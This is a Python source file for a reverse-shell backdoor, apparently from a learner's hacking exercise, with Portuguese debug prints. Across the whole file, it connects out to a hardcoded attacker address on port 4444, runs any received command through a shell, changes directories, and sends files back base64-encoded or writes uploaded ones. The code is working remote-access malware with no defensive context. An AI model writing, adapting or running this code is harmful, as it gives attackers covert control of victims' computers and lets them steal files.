import socket,json
import subprocess
import os
import base64



class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Changed connection to self.connection
        self.connection.connect((ip, port)) 

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))  # Added .encode('utf-8')

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode('utf-8')
        
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Sucessfull"
    

    def execute_system_command(self, command):
        command = command.strip()
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        return output + error
    
    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return f"[+] Directory changed to: {os.getcwd()}"
        except Exception as e:
            return f"[-] Error changing directory: {str(e)}. Current directory: {os.getcwd()}"


    def run(self):
        self.connection.send("\n[+] Connection established. \n".encode())

        while True:
            try:
                command = self.connection.recv(1024).decode('utf-8')  # Decode the received bytes into a string
                print("esse eh o comando",command)
                path = command[3:].strip()  # Aqui estou retirando as aspas
                print("esse eh o caminho",path)

                # Check for 'exit' command to close the connection~
                command = command.strip('"')
                if command == "exit":
                    print("Closing connection...")
                    self.connection.close()
                    exit()
                    break

                elif command.startswith("cd "):
                    print("fez qualquer coisa")
                    path = command[3:].strip()  # Aqui estou retirando as aspas
                    path=path.strip('"')
                    print(path)
                    command_result = self.change_working_directory_to(path)
                
                elif command.startswith("download"):
                    command_result=self.read_file(command[9:].strip())
                    print(command_result)

                elif command.startswith("upload"):
                    _, file_name, file_content = command.split(" ", 2)
                    command_result = self.write_file(file_name, file_content)


                else:
                      # Remove any double quotes
                    command_result = self.execute_system_command(command)

                print("passou por aqui")
                self.reliable_send(command_result)
                print("passou por aqui")
                
            except socket.timeout:
                print("Timed out waiting for response.")
            except Exception as e:
                print(f"Error encountered: {e}")
                break



my_backdoor = Backdoor("192.168.1.64", 4444)
my_backdoor.run()
